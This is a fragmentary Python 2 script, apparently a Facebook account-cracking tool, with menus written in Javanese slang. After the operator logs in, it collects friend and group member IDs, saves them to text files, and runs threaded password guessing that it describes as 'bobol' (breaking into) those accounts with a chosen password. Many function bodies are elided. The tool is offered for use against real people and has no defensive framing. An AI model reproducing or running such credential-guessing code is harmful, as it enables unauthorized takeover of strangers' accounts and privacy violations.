...
if platform.python_version().split('.')[0] != '2':
	cetak('!m[!] Koe gae python versi %s silahkan gae versi 2.x.x'%v().split(' ')[0])
	sys.exit()
import cookielib,re,urllib2,urllib,threading
try:
  import mechanize
except ImportError:
	cetak('!m[!] koyok e !cmechanize!m koe urung install...\n!h[!] pip2 install mechanize')
	sys.exit()
br = 0
log = 0
id_bteman = []
...
def tampilhasil(akun,sandi,data):
	...
	i = inputD('[?] Ora Puas? Jajal Neh Pie? (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(data)
	else:
		return menu()
def crack0(data,sandi):
	akun = []
	cetak('!h[*] Bobol !k%d Akun !hdengan sandi !m[!k%s!m]'%(len(data),sandi))
	cetak('!h[*] Gaskeun Broo  !k0!m%',1)
	sys.stdout.flush()
	jml0,jml1 = 0,0
	th = []
	for i in data:
	...
	while 1:
		try:
			for i in th:
				status,id = i.update()
				if status != 0:
					cetak('\r!h[*] Gaskeun Broo  !k%d!m%s!0'%(int(float((float(jml0)/float(jml1))*100)),'%'),1)
					sys.stdout.flush()
					del(th[th.index(i)])
					if status == 4:
						h_error.append(id)
...
def bacaData():
	...
	try:
		fid_bteman = open(os.sys.path[0]+'/Konco.txt','r').readlines()
	except:pass
def simpan():
	if len(id_bgroup) != 0:
		cetak('!h[*] Nyimpen hasil teko Group')
		try:
			open(os.sys.path[0]+'/Grup.txt','w').write('\n'.join(id_bgroup))
			cetak('!h[!] Berhasil nyimpen cuk !cGrup.txt')
		except:
			cetak('!m[!] Gagal nyimpen goblok')
	if len(id_bteman) != 0:
		cetak('!h[*] Nyimpen daftar konco boss...')
		try:
			open(os.sys.path[0]+'/Konco.txt','w').write('\n'.join(id_bteman))
			cetak('!h[!] Ciee berhasil nyimpenn !cKonco.txt')
		except:
			cetak('!m[!] Gagal nyimpen goblok')
def keluar():
	simpan()
	...
	while 1:
		...
		if v:
			if a.upper() in v:
				...
				cetak('!m[!] Lebokne Opsine Boss...')
				continue
		else:
			if len(a) == 0:
				cetak('!m[!] Masukan dengan benar njeng')
				continue
			else:
				break
	return a
...
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		i = inputD('[?] Riset Grup/lanjutkan pora (r/l)',['R','L'])
		if i.upper() == 'L':
...
def lanjutT():
	global fid_bteman
	if len(fid_bteman) != 0:
		i = inputD('[?] Riset Konco/lanjutkan pora (r/l)',['R','L'])
		if i.upper() == 'L':
			return crack(fid_bteman)
		else:
			os.remove(os.sys.path[0]+'/Konco.txt')
			fid_bteman = []
	return 0
def buka(d):
	try:
		...
		cetak('\r!m[!] Gagal bukak asu !p'+str(d))
		keluar()
...
def login():
	global log
	us = inputD('[?] Email boss')
	pa = inputD('[?] Lha password e')
	cetak('!h[*] Login sek njeng....')
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		cetak('!h[*] Woy !k%s'%nama)
		cetak('!h[*] Wajahmu kok elek tenan wkwk...')
		log = 1
	elif 'checkpoint' in url:
		cetak('!m[!] Akun kenek checkpoint\n!k[!]Jajal login gawe browser')
		keluar()
	else:
		cetak('!m[!] Login Gagal Njeng')
def idgroup():
	if log != 1:
		cetak('!h[*] Login !bFB!h sek yo bos...')
		login()
		if log == 0:
			keluar()
	...
	while 1:
		...
		try:
			...
			cetak('!m[!] Iso Nyimpen !h %d id'%len(id_bgroup))
			break
	simpan()
	i = inputD('[?] Gaskeun bosque (y/t)',['Y','T'])
	if i.upper() == 'Y':
...
def idteman():
	if log != 1:
		cetak('!h[*] Login !bFB !hdisik boss...')
		login()
		if log == 0:
			keluar()
	cetak('!h[*] Nglumpukne ID konco...')
	...
	cetak('!h[*] Nglumpukne !p%s !hid konco'%jumlah) 
	...
	try:
		...
		if len(id_teman) != 0:
			cetak('!m[!] Isone iki tok !p%d id'%len(id_bteman))
		else:
			cetak('!m[!] Batal')
			keluar()
	while 1:
		...
		try:
			...
			cetak('\n!m[!] Isone iki tok !p%d id'%len(id_bteman))
			break
	simpan()
	i = inputD('[?] Gaskeun bosque (y/t)',['Y','T'])
	if i.upper() == 'Y':
